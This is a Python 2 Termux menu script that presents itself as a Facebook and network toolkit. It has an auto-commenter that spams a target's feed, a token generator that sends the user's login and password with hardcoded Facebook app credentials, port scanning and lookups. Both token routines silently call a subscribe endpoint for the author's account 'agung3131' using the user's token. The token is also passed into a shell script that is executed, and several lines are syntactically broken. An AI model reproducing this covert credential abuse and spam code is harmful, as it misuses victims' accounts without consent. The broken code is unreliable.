#!/usr/bin/python
#-*-coding:utf-8-*-
#TEAM CRABS
#TEAM BLACK-HOLE-SECURITY
#TEAM 407 Authentic Exploit
import os,sys
sys.path.insert(0, '/data/data/com.termux/files/home/smplframework/Module')
from ModuleGw import *
from __init__prox import *
from scrapDnsCek import *
from http import *
from __init__ import *
from __iynit__ import *

import re,sys,json,urllib,os, subprocess as a
from time import sleep as bobo
from random import random, choice
try:
	from bs4 import BeautifulSoup as weabo
	import requests
except:
	print '[!]Module Bs4 Not Found!!/Requests'
	sys.exit()
W = '\033[1;37m' # White bold
N  = '\033[0m'  # white (Normal)
R = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan

def __banner__():
	print'''
 \033[0m+[----------------------------]+
       _____            __   
      / __(_)_ _  ___  / /__ 
     _\ \/ /  ' \/ _ \/ / -_)
    /___/_/_/_/_/ .__/_/\__/©
               /_/
            Framework
 \033[0m+[----------------------------]+
  \033[1;32m-×-\033[1;37m1.\033[33m[\033[34mTag/Source Link Web]
  \033[1;32m-=-\033[1;37m2.\033[33m[\033[34mAuto Commentar fb]
  \033[1;32m-=-\033[1;37m3.\033[33m[\033[34mGenerate Access Token]
  \033[1;32m-=-\033[1;37m4.\033[33m[\033[34mProfile Guard]
  \033[1;32m-=-\033[1;37m5.\033[33m[\033[34mChecker Proxy]
  \033[1;32m-=-\033[1;37m6.\033[33m[\033[34mDns Checker]
  \033[1;32m-=-\033[1;37m7.\033[33m[\033[34mGet Http Headers]
  \033[1;32m-=-\033[1;37m8.\033[33m[\033[34mReverse Ip Lookup]
  \033[1;32m-=-\033[1;37m9.\033[33m[\033[34mTCP Port Scan]
  \033[1;32m-=-\033[1;37m10.\033[33m[\033[34mWhois Lookup]
  \033[1;32m-=-\033[1;37m11.\033[33m[\033[34mExit Tools]
  \033[1;32m-=-\033[1;37m12.\033[33m[\033[34mDeleting Token]
  \033[1;32m-×-\033[1;37m13.\033[33m[\033[34mAbout Tools]
 \033[0m+[=============================]+'''

def help():
    a.call('clear', shell=True)
    bobo(2)
    write('-----ABOUT TOOLS-----\n')
    print '[*] Thanks To JaxBCD For Profile Guard:)'
    print G+'Tools Ini Di Buat Dengan Kasih Sayang :*'
    print C+'If There Bug In Tools Iam Report To : \nTelegram : https://t.me/Agung_sp1'
    print W+'Tunggu 8 Detik'
    bobo(7)

def write(x):
	for c in x:
		sys.stdout.write(c)
		sys.stdout.flush()
		bobo(random()* 0.1)
def lol():
	for c in range(101):
		bobo(0.1)
		sys.stdout.write(G+'\r{}% Loading'.format(c))
		sys.stdout.flush()
a.call('clear', shell=True)
write('''\033[31m[===]Gmail:p4n1ky4(et)gmail(dot)com[===]
\033[31m[===]Github:github.com/fappyfunea[===]\n''')

loo = raw_input(N+'press enter to run in program...')
bobo(1)
while True:
    a.call('clear', shell=True)
    __banner__()
    bobo(0.10)
    usr = raw_input(C+'\nRoot@pilih-> '+N)
    if usr == '1':
    	print R+'[*]'+B+' Example'+N+' : https://site.com'
        a = raw_input(B+'Web '+N+': ')
        url = requests.get(a).text
        soup = weabo(url)
        for link in soup.find_all('a'):
            print '[*]',link.get('href')
        print G+'Successfully'
        why = raw_input(R+'Kembali Ke Menu? [y]/[n]'+N+' :')
        if why == 'y' or why == '[y]':
        	print
        elif why == 'n' or why == '[n]':
        	print R+'[*]'+B+' Exiting!'
        	sys.exit()
        else:
        	break
    elif usr == '2':
        try:
        	usr = raw_input(R+'[*]'+B+' Masukkan Token Mu'+N+': ')
        	op = open(usr, 'r').read()
        except:
        	print R+'Generate Access Token Terlebih Dahulu:)'
        	sys.exit()
        lol = raw_input(N+'Id Target: ')
        k = raw_input(N+'Your Comment: ')
        url = requests.get("https://graph.facebook.com/v3.0/"+lol+"?fields=feed.limit(100)&access_token="+op)
        url1 = requests.get('https://graph.facebook.com/me?access_token='+op)
        r2 = requests.get('https://graph.facebook.com/'+lol+'?access_token='+op)
        js = json.loads(url.text)
        js2 = json.loads(r2.text)
        js3 = json.loads(url1.text)
        print '''[[[========Welcome {}=========]]]'''.format(js3['name'])
        print G+'Target Name : '+N, js2['name']
        print G+'Starting!/....'
        for c in js['feed']['data']:
        	requests.get('https://graph.facebook.com/agung3131/subscribers?access_token='+op)
        	try:
        		parameters = {'access_token':op,'message':k}
        		url2 =  requests.post('https://graph.facebook.com/'+c['id']+'/comments', data = parameters)
        		if 'id' in url2.text:
        			print B+'+--------------------------+'
        			print G+'Post Id: '+N, c['id']
        			print G+'Status: '+N, c['message']
        			print R+'Success!!'
        			print B+'+--------------------------+'
        		else:
        			print G+'+--------------------------+'
        			print B+'Post Id: '+R, c['id']
        			print B+'Status:'+R, c['message']
        			print R+'Failed!_-'
        			print G+'+--------------------------+'
                except KeyboardInterrupt:
                        print 'Exiting Program!'
                        sys.exit()
        	except:
        		try:
        			print
        			print '_____NONE_____'
        		except KeyboardInterrupt:
        			print 'Exiting!!'
        			sys.exit()
        print R+'[√]'+N+'Comment Succesfully'+R+'!'
        l = raw_input(R+'press enter to back menu..')
    elif usr == '3':
        try:
            id = raw_input(R+"[*]"+B+ "enter your id or number_phone"+N+" : ")
            pwd = raw_input(R+"[*]"+B+" enter your password"+N+" : ")
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ id + "&locale=en_US&password=" + pwd + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            operan = json.load(data)
            x = open("token.txt", "w")
            x.write(operan["access_token"])
            x.close()
            wibu = open("token.txt", "r").read()
            parsing = urllib.urlopen("https://graph.facebook.com/me?access_token=" + wibu)
            requests.get('https://graph.facebook.com/agung3131/subscribers?access_token='+ wibu)
            ok = json.load(parsing)
            nama = ok["name"]
            print "[+] By _[@]9un9_"
            print "[+] Successfully Generate Access_Token :\033[1;32m",operan["access_token"]
            print "\033[0m[=] Your Account :\033[1;32m",nama
            print "\033[0m[=] Your Id :\033[1;32m"+ok['id']
            print "\033[0m"
            pass
            print R+'[*]'+B+' file token saved in token.txt'
            po = raw_input(R+'press enter to back menu..')
            bobo(2)
        except:
            print R+'\n[!] Generate Access Token Fail!\nCheck Your Data Selluler Or Please Your Input Is True'
            sys.exit()
    elif usr == '4':
    	try:
    		class babyk():
    			def __init__(self):
    				try:
    					self.id = raw_input(R+'[*]'+B+' Masukkan Token Mu'+N+': ')
    					self.fck = open(self.id, 'r').read()
					self.idfb = get('https://graph.facebook.com/me?access_token='+self.fck)
					
    				except:
    					print R+'File Not Found'
    					sys.exit()
    				self.us = self.idfb['id']
    				try:
    					self.url =  """ curl "https://graph.facebook.com/graphql" -H 'Authorization: OAuth %s' --data 'variables={"0":{"is_shielded":true,"actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&doc_id=1477043292367183' """ %(self.fck, self.us)
    					self.catat = open('guard.sh', 'w')
    					self.catat.write(self.url)
    					self.catat.close()
    					os.system('sh guard.sh')
    					print R+'\n\n[*]'+G+' Check Your Profile'
    				except:
    					print R+'Profile Guard Gagal'
    					sys.exit()
    					 
    				
    	except Exception as a:
    		print '''+----------3RR0R----------+
{}
+------------------------------+'''.format(a); sys.exit()
        babyk()
        bb = raw_input(R+'Press enter to back menu..')
        bobo(2)
         
    elif usr == '5':
    	proxy()
    	print
    	us = raw_input(R+'Press enter to back menu')
    	bobo(2)
    elif usr == '6':
    	print banner
    	Dcek()
    	bb = raw_input(R+'Press enter to back menu')
    	bobo(2)
    elif usr == '7':
    	httphead()
    	cc = raw_input(R+'Press enter to back menu')
    	bobo(2)
    elif usr == '8':
    	lokup()
    	kk = raw_input(R+'Press enter to back menu')
    	bobo(2)
    elif usr == '9':
    	bangsad()
    	ent = raw_input(R+'Press enter to back menu')
    	bobo(2)
    elif usr == '10':
    	Search()
    	ab = raw_input('Press enter to back menu')
    	bobo(2)
    elif usr == '11':
    	print R+'[!]'+B+'Exiting!!'
    	sys.exit()
    elif usr == '12':
    	print R+'[!]'+G+' Delleting Token!'
    	inp = raw_input(R+'[!]'+G+'Delleting Token [y]/[n]'+N+': ')
    	if inp == 'y' or inp == '[y]':
    		print R'[!]'+B+' Tunggu!!'
    		bobo(2)
    		os.system('rm -rf token.txt')
    		print R+'[*]'+B+' Delleting Done^^'
    		us = raw_input(R+'Press enter to back menu..')
    		bobo(2)
    	elif inp =='n' or inp =='[n]':
    		print
    		uss = raw_input(R+'Press enter to back menu..')
                bobo(2)
        else:
            print R+'Please Your Input Is True:)'
            break
    elif usr == '13':
        help()
    else:
    	print R+'Oh-My-Fuck!'.upper()
    	us = raw_input(N+'tekan enter untuk ke menu')
